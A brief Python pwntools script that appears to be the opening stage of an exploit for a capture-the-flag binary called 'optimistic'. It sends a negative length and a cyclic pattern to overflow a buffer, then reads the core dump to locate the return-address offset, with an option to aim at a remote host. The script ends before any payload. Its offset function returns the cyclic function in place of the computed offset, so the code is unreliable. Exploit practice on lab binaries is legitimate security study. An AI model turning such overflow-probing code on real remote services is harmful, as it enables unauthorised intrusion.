from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

exe = './optimistic'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

def getOffset(pattern):
    sh = process(exe)
    sh.sendlineafter(':', 'y')
    sh.sendlineafter(':', 'aa')
    sh.sendlineafter(':', 'aa')
    sh.sendlineafter(':', '-1')
    sh.sendlineafter(':', pattern)
    sh.wait()
    offset = cyclic_find(sh.corefile.read(sh.corefile.sp,4))
    info('EIP/RIP offset : {i}'.format(i=offset))
    return cyclic

sh = start()
pattern = cyclic(1024)
offset = getOffset(pattern)
